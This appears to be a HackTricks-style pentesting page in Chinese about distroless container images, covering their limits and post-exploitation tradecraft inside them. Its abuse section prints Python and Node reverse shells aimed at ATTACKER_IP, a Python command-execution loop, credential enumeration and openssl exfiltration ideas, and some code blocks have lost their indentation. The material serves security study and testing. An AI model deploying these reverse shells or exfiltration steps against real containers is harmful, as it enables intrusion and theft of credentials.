# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## 概述

一个 **distroless** container image 是只包含运行一个特定应用所需的**最小运行时组件**的镜像，同时刻意移除了通常的发行版工具，例如包管理器、shell，以及大量通用的 userland 实用工具。实际上，distroless 镜像通常只包含应用二进制或运行时、其共享库、证书包，以及非常精简的文件系统布局。

关键不在于 distroless 是一种新的内核隔离原语。Distroless 是一种 **镜像设计策略**。它改变的是容器文件系统**内部**可用的内容，而不是内核如何隔离容器。这个区别很重要，因为 distroless 主要通过减少攻击者在获得代码执行后能使用的工具来增强环境。它并不能替代 namespaces、seccomp、capabilities、AppArmor、SELinux 或任何其他运行时隔离机制。

## Why Distroless Exists

Distroless 镜像主要用于减少：

- 镜像体积
- 镜像的运维复杂度
- 可能包含漏洞的软件包和二进制数量
- 默认情况下攻击者可用的事后利用工具数量

这就是为什么 distroless 镜像在生产应用部署中很受欢迎。一个没有 shell、没有包管理器、几乎没有通用工具的容器，通常在运维上更容易推理，在被入侵后也更难被交互式滥用。

知名的 distroless 风格镜像家族示例包括：

- Google's distroless images
- Chainguard hardened/minimal images

## What Distroless Does Not Mean

一个 distroless 容器**并不等同于**：

- 并不会自动成为 rootless
- 并不会自动变为 non-privileged
- 并不会自动变为只读
- 并不会自动受 seccomp、AppArmor 或 SELinux 保护
- 并不会自动免受 container escape

仍然可以以 `--privileged`、共享 host namespaces、危险的 bind mounts，或挂载的 runtime socket 来运行 distroless 镜像。在那种场景下，镜像可能非常精简，但容器依然可能极其不安全。Distroless 改变的是**用户空间的攻击面**，而不是**内核的信任边界**。

## Typical Operational Characteristics

当你攻破一个 distroless 容器时，最先注意到的通常是常见假设不再成立。可能没有 `sh`、没有 `bash`、没有 `ls`、没有 `id`、没有 `cat`，有时甚至没有按你常用作业方式运行的基于 libc 的环境。这会影响攻防双方，因为工具的缺失使得调试、事件响应和事后利用都不同于常见的 Linux 目标。

最常见的模式是：

- 应用运行时存在，但其他几乎不存在
- 基于 shell 的 payload 失败，因为没有 shell
- 常见的枚举单行命令失败，因为 helper 二进制缺失
- 文件系统保护，如只读 rootfs 或可写 tmpfs 上挂载 `noexec`，也经常存在

这种组合通常促使人们谈论将 distroless 武器化。

## Distroless And Post-Exploitation

在 distroless 环境中，主要的攻击挑战并不总是初始的 RCE。更常见的是接下来会发生什么。如果被利用的工作负载在诸如 Python、Node.js、Java 或 Go 这样的语言运行时中提供了代码执行，你可能能够执行任意逻辑，但无法通过在其他 Linux 目标中常见的以 shell 为中心的工作流来实现。

这意味着事后利用通常会沿三条方向之一展开：

1. **直接使用现有的语言运行时** 来枚举环境、打开套接字、读取文件或部署额外的分阶段有效载荷。
2. **将你自己的工具装入内存**，如果文件系统是只读或可写位置被挂载为 `noexec`。
3. **滥用镜像中已存在的二进制**，如果应用或其依赖包含意外有用的东西。

## Abuse

### Enumerate The Runtime You Already Have

在许多 distroless 容器中没有 shell，但仍然存在应用运行时。如果目标是一个 Python 服务，那么 Python 就在。如果目标是 Node.js，Node 就在。那通常提供了足够的功能来枚举文件、读取环境变量、打开反向 shell，并在不调用 `/bin/sh` 的情况下阶段性地加载内存执行。

一个用 Python 的简单示例：
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
一个简单的 Node.js 示例：
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
影响：

- 恢复环境变量，通常包括 credentials 或 service endpoints
- 在没有 `/bin/ls` 的情况下进行文件系统枚举
- 识别可写路径和挂载的 secrets

### 在没有 `/bin/sh` 的情况下的 Reverse Shell

如果镜像不包含 `sh` 或 `bash`，经典的基于 shell 的 reverse shell 可能会立即失败。在这种情况下，请改用已安装的语言 runtime。

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
如果 `/bin/sh` 不存在，请将最后一行替换为直接由 Python 驱动的命令执行或一个 Python REPL 循环。

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
再次，如果 `/bin/sh` 不存在，直接使用 Node 的 filesystem、process 和 networking APIs，而不是 spawn 一个 shell。

### 完整示例：No-Shell Python Command Loop

如果镜像包含 Python 但完全没有 shell，一个简单的交互循环通常足以保持完整的 post-exploitation 能力：
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
这不需要交互式 shell binary。对攻击者而言，其影响实际上等同于一个基本的 shell：command execution、enumeration，以及通过现有 runtime 对后续 payloads 的 staging。

### 内存中工具执行

Distroless images 通常与以下设置一起使用：

- `readOnlyRootFilesystem: true`
- writable but `noexec` tmpfs such as `/dev/shm`
- a lack of package management tools

这种组合使得经典的 "download binary to disk and run it" 工作流变得不可靠。在这种情况下，memory execution techniques 成为主要解决方案。

The dedicated page for that is:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

其中最相关的技术有：

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### 镜像中已存在的二进制文件

一些 Distroless images 仍然包含在运行时操作上必需的二进制文件，在被攻破后可能会很有用。一个经常观察到的例子是 `openssl`，因为应用有时需要它来处理 crypto 或 TLS 相关的任务。

一个快速的搜索模式是：
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
If `openssl` is present, it may be usable for:

- 发起出站 TLS 连接
- 通过允许的出站通道进行 data exfiltration
- 通过编码/加密的 blobs 暂存 payload 数据

具体的滥用取决于实际安装了哪些内容，但总体思想是 distroless 并不意味着 "no tools whatsoever"；它的意思是 "far fewer tools than a normal distribution image"。

## Checks

这些检查的目标是确定镜像在实际中是否真正为 distroless，以及哪些 runtime 或 helper binaries 仍可用于 post-exploitation。
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
值得注意的是：

- 如果没有 shell，但存在诸如 Python 或 Node 这样的 runtime，post-exploitation 应转向由 runtime 驱动的执行。
- 如果 root filesystem 是只读的且 `/dev/shm` 可写但 `noexec`，内存执行技术（memory execution techniques）会变得更加相关。
- 如果存在像 `openssl`、`busybox` 或 `java` 这样的辅助二进制文件，它们可能提供足够的功能来引导获取进一步的访问。

## 运行时默认

| 镜像 / 平台 风格 | 默认状态 | 典型行为 | 常见的手动弱化 |
| --- | --- | --- | --- |
| Google distroless style images | 设计上保持最小的用户空间 | 无 shell、无包管理器，仅包含应用/运行时依赖 | 添加调试层、sidecar shells、复制 busybox 或其他工具 |
| Chainguard minimal images | 设计上保持最小的用户空间 | 减少包面，通常专注于单一 runtime 或服务 | 在构建时使用 `:latest-dev` 或调试变体，复制工具 |
| Kubernetes workloads using distroless images | 取决于 Pod 配置 | Distroless 仅影响用户空间；Pod 的安全 posture 仍取决于 Pod 规范和运行时默认设置 | 添加临时的 debug containers、host mounts、privileged Pod 设置 |
| Docker / Podman running distroless images | 取决于运行标志 | 文件系统最小化，但运行时安全仍依赖于标志和守护进程配置 | `--privileged`、host namespace 共享、runtime socket 挂载、可写的主机绑定 |

关键点是 distroless 是一种 **镜像特性**，而不是运行时保护。它的价值在于在被攻陷后减少文件系统内可用的内容。

## 相关页面

关于在 distroless 环境中常见的文件系统和内存执行绕过：

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

关于仍适用于 distroless 工作负载的容器运行时、socket 和挂载滥用：

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
